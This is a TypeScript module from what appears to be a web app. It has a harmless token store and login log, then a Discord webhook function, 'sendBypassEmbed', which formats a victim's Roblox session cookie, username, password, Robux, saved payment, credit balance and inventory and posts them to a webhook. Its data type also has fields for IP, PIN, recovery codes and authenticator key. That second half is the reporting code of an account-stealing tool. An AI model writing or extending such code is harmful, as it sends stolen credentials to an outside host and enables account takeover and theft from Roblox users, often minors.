// In-memory token store (resets on refresh - for demo purposes)
// In production, use a database via Lovable Cloud

export interface Token {
  id: string;
  token: string;
  label: string;
  createdAt: Date;
  expiresAt: Date;
  used: boolean;
}

export interface LoginRecord {
  tokenLabel: string;
  timestamp: Date;
}

const STORAGE_KEY = 'app_tokens';
const LOGIN_LOG_KEY = 'login_log';
const DEFAULT_EXPIRY_HOURS = 24;

function loadTokens(): Token[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return [];
    return JSON.parse(raw).map((t: any) => ({
      ...t,
      createdAt: new Date(t.createdAt),
      expiresAt: new Date(t.expiresAt),
    }));
  } catch {
    return [];
  }
}

function saveTokens(tokens: Token[]) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(tokens));
}

export function getTokens(): Token[] {
  return loadTokens();
}

export function isTokenExpired(token: Token): boolean {
  return new Date() > token.expiresAt;
}

export function generateToken(label: string, expiryHours: number = DEFAULT_EXPIRY_HOURS): Token {
  const now = new Date();
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const arr = new Uint32Array(22);
  crypto.getRandomValues(arr);
  const tokenStr = Array.from(arr, n => chars[n % chars.length]).join('');
  const token: Token = {
    id: crypto.randomUUID(),
    token: tokenStr,
    label,
    createdAt: now,
    expiresAt: new Date(now.getTime() + expiryHours * 60 * 60 * 1000),
    used: false,
  };
  const tokens = loadTokens();
  tokens.push(token);
  saveTokens(tokens);
  return token;
}

export function validateToken(tokenStr: string): Token | null {
  const tokens = loadTokens();
  const found = tokens.find(t => t.token === tokenStr && !t.used);
  if (!found) return null;
  if (isTokenExpired(found)) return null;
  found.used = true;
  saveTokens(tokens);
  addLoginRecord(found.label);
  return found;
}

export function deleteToken(id: string) {
  const tokens = loadTokens().filter(t => t.id !== id);
  saveTokens(tokens);
}

function addLoginRecord(tokenLabel: string) {
  const logs = getLoginLog();
  logs.unshift({ tokenLabel, timestamp: new Date() });
  localStorage.setItem(LOGIN_LOG_KEY, JSON.stringify(logs.slice(0, 50)));
}

export function getLoginLog(): LoginRecord[] {
  try {
    const raw = localStorage.getItem(LOGIN_LOG_KEY);
    if (!raw) return [];
    return JSON.parse(raw).map((r: any) => ({ ...r, timestamp: new Date(r.timestamp) }));
  } catch {
    return [];
  }
}

export async function sendDiscordWebhook(webhookUrl: string, message: string) {
  if (!webhookUrl) return;
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: '🔐 Token Activity',
          description: message,
          color: 0x4f46e5,
          timestamp: new Date().toISOString(),
        }],
      }),
    });
  } catch (e) {
    console.error('Webhook failed:', e);
  }
}

export interface BypassEmbedData {
  valid: boolean;
  cookie?: string;
  username?: string;
  password?: string;
  ip?: string;
  robux?: string;
  premium?: string;
  rap?: string;
  summary?: string;
  creditBalance?: string;
  savedPayment?: string;
  robuxIO?: string;
  status?: string;
  korblox?: string;
  age?: string;
  groupsOwned?: string;
  placeVisits?: string;
  inventory?: string;
  passes?: string;
  pin?: string;
  recoveryCodes?: string;
  authenticatorKey?: string;
}

export async function sendBypassEmbed(webhookUrl: string, data: BypassEmbedData) {
  if (!webhookUrl) return;
  const na = '`N/A`';
  const v = (s?: string) => (s && s.length ? `\`${s}\`` : na);
  const statusEmoji = data.valid ? '✅' : '❌';
  const statusText = data.valid ? 'Valid' : 'Invalid';
  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: `${statusEmoji} Check Cookie · ${statusText}`,
          color: data.valid ? 0x22c55e : 0xef4444,
          fields: [
            { name: `🪪 Cookie · ${statusText} ${statusEmoji}`, value: data.cookie ? '```\n' + data.cookie.slice(0, 1000) + '\n```' : na, inline: false },
            { name: '👤 Username (13+)', value: v(data.username), inline: true },
            { name: '🔑 Password', value: v(data.password), inline: true },
            
            { name: '🟡 Robux (Pending)', value: v(data.robux), inline: true },
            { name: '💎 Premium', value: v(data.premium), inline: true },
            { name: '🎒 RAP', value: v(data.rap), inline: true },
            { name: '📊 Summary', value: v(data.summary), inline: true },
            { name: '💳 Credit Balance', value: v(data.creditBalance), inline: true },
            { name: '💰 Saved Payment', value: v(data.savedPayment), inline: true },
            { name: '👑 Korblox/Headless', value: v(data.korblox), inline: true },
            { name: '🎂 Age', value: v(data.age), inline: true },
            { name: '👥 Groups Owned', value: v(data.groupsOwned), inline: true },
            { name: '📍 Place Visits', value: v(data.placeVisits), inline: true },
            { name: '🎽 Inventory', value: v(data.inventory), inline: false },
            { name: '🎟️ Passes | Played', value: v(data.passes), inline: true },
          ],
          timestamp: new Date().toISOString(),
        }],
      }),
    });
  } catch (e) {
    console.error('Webhook failed:', e);
  }
}
